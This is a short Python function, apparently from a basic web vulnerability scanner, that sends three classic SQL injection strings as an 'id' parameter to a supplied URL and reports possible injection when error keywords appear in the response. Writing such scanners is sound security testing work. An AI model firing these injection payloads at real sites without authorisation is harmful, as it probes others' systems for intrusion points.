import requests

def test_sqli(url):
    payloads = ["' OR '1'='1", '" OR "1"="1', "admin'--"]
    vulnerable = False
    details = []

    for payload in payloads:
        try:
            resp = requests.get(url, params={"id": payload}, timeout=3)
            if any(err in resp.text.lower() for err in ["sql", "syntax", "mysql", "error"]):
                vulnerable = True
                details.append(f"Possible SQLi with payload: {payload}")
        except:
            continue

    return {"sqli": vulnerable, "details": details}
